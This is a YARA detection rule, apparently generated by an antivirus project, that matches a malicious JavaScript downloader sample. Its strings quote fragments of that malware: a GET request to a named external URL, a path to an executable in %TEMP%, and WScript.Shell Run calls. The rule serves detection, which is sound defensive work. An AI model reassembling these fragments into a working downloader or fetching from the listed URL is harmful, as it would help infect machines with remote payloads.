rule sig_20160328_cc3dd5bd060b8402b3292f8a15144af9 {
  meta:
    description = "datamaliciousorder - file 20160328_cc3dd5bd060b8402b3292f8a15144af9.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "9ea2eb6dabd54e80929c08ca238160673fc8f7fec963857d09cc5b2449889adb"

  strings:
    $s1  = "function Yadlhqn() {return Rxbxjug[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"QVabGYuE.exe\";};" fullword ascii
    $s2  = "do {WScript[Bpubnar](Lrdqu() * 11)} while (Plmbo[\"readystate\"] < 4 );" fullword ascii
    $s3  = "function Eomafifp(Evapbrryv, Jolwbsqac){return Evapbrryv - Jolwbsqac;};" fullword ascii
    $s4  = "Plmbo[Qyddjrpr](\"GET\", \"http://www.europaklasse-lbk.de/p4iska\", false);" fullword ascii
    $s5  = "var Rxbxjug = function Pilyqfpj() {return WScript[Gmbepdx](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Udtie() {return ((Knorfcs == true) && (Knorfcs == Sskjrysd)) ? 1 : Hprcxgix;};" fullword ascii
    $s7  = "function Yhmsryokoj(Jlffie){Rxbxjug[\"Run\"](Jlffie, Hprcxgix, Hprcxgix);};" fullword ascii
    $s8  = "function Ceyuxir(){return Gmbepdx;};" fullword ascii
    $s9  = "function Lrdqu(){return 22;};" fullword ascii
    $s10 = "Sskjrysd = true; " fullword ascii
    $s11 = "return Eomafifp(Lchvdvdhu, Aujlhme);" fullword ascii
    $s12 = "var Zstehhmgcl = new this[\"Date\"]();" fullword ascii
    $s13 = " while (Rttneg){" fullword ascii
    $s14 = "function Hfvztlkg()" fullword ascii
    $s15 = "var Pehwuv = false;" fullword ascii
    $s16 = "Knorfcs = true; " fullword ascii
    $s17 = "var Knorfcs = false;" fullword ascii
    $s18 = "function Fgihyeyzl(){return Gsrgeollvs;};" fullword ascii
    $s19 = "function Hranvwypb(Rvwxj) {var Czemr = (1, 2, 3, 4, 5, Rvwxj); return Czemr;};" fullword ascii
    $s20 = "var Sskjrysd = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}